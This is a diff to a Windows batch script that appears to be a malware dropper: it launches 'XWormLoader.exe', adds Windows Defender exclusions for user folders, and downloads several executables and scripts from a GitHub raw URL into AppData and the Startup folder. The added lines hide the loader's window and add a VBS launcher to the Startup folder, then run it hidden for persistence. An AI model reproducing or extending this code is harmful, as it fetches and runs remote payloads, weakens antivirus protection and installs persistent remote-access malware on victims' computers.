@@ -25,11 +25,13 @@ if '%errorlevel%' NEQ '0' (
     CD /D "%~dp0"
 :--------------------------------------
 
-powershell Start-Process "XWormLoader.exe"
+
+powershell Start-Process "XWormLoader.exe" -WindowStyle Hidden
 
 powershell.exe Add-MpPreference -ExclusionPath "C:\Users"
 powershell.exe Add-MpPreference -ExclusionPath "%USERPROFILE%\Downloads"
 
+powershell -c "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/SszOnTop/2z/main/launcher.vbs' -OutFile '%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\launcher.vbs'"
 powershell -c "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/SszOnTop/2z/main/ctfmon.exe' -OutFile '%USERPROFILE%\AppData\Roaming\Microsoft\ctfmon.exe'"
 powershell -c "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/SszOnTop/2z/main/run.bat' -OutFile '%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\runfile.bat'"
 powershell -c "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/SszOnTop/2z/main/Drivers.exe' -OutFile '%USERPROFILE%\DriversInitialisation.exe'"
@@ -37,6 +39,7 @@ powershell -c "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/SszOnTo
 cd "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 
 powershell Start-Process "runfile.bat" -WindowStyle Hidden
+powershell Start-Process "launcher.vbs" -WindowStyle Hidden
 
 cd "%USERPROFILE%\AppData\Roaming\Microsoft"
 
